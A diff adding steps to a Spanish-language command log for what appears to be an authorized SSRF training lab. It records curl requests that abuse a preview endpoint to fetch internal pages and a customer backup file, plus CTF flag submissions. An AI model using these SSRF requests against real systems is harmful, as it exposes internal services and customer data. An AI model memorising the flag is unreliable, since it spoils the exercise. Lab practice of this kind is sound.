@@ -29,3 +29,33 @@ PowerShell:
 11. docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml down
     Objetivo: detener y retirar los contenedores del laboratorio creados en esta sesión.
 
+P2 — Lab Extra, Grupo 06 — 28/10/2026
+12. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab10-deteccion-evasion/entorno/target.compose.yml down
+    Objetivo: retirar el stack activo del Lab 10 antes de las pruebas; el contenedor phantomcorp estaba asociado a ese compose.
+13. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build
+    Objetivo: levantar específicamente el entorno SSRF autorizado.
+14. Consola atacante, invocada desde PowerShell: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 3 http://phantomcorp-intra/"
+    Objetivo: probar acceso directo a la intranet. Salida original: salidas/08-p2-directo.txt (curl 6: no resuelve el hostname).
+15. Consola atacante: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/' http://phantomcorp/preview"
+    Objetivo: consultar la home interna mediante preview. Salida original: salidas/09-p2-intranet-preview.txt (HTTP 200 y contenido interno).
+16. Consola atacante, siguiendo el enlace `/salud` visible en la salida 09: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/salud' http://phantomcorp/preview"
+    Objetivo: comprobar el recurso enlazado tras el rechazo del primer intento de presentación. Salida original: salidas/10-p2-salud-preview.txt.
+17. Git Bash, desde la raíz: ./ctf submit extra R2 "FLAG{ssrf_intranet_descubierta}"
+    Objetivo: presentar la cadena observada en la respuesta de la intranet. El verificador la rechazó; salida original: salidas/11-p2-submit.txt.
+18. Git Bash, desde la raíz: ./ctf status extra
+    Objetivo: conservar el estado posterior al intento fallido. Salida original: salidas/12-p2-status.txt (0/3 en esta sesión).
+19. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml down
+    Objetivo: retirar los contenedores del Lab Extra al finalizar las pruebas.
+
+P2 — seguimiento a consulta del usuario — 28/10/2026
+20. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build
+    Objetivo: volver a levantar el entorno SSRF correcto para seguir únicamente los enlaces publicados por la intranet.
+21. Consola atacante: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/' http://phantomcorp/preview"
+    Objetivo: corroborar la home y sus enlaces publicados. Salida original: salidas/13-p2-intranet-home-recheck.txt.
+22. Consola atacante, siguiendo el enlace `/salud`: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/salud' http://phantomcorp/preview"
+    Objetivo: revisar el estado del servicio. Salida original: salidas/14-p2-salud-recheck.txt (sin flag).
+23. Consola atacante, siguiendo el enlace `/backups/clientes.json`: docker exec cyberlab-attacker bash -c "curl -sS -i --max-time 10 --get --data-urlencode 'url=http://phantomcorp-intra/backups/clientes.json' http://phantomcorp/preview"
+    Objetivo: verificar si el otro recurso enlazado contiene una respuesta distinta para R2. Salida original: salidas/15-p2-backup-link.txt (contiene la flag identificada como R3).
+24. PowerShell, desde la raíz: docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml down
+    Objetivo: retirar los contenedores del Lab Extra al terminar la revisión.
+
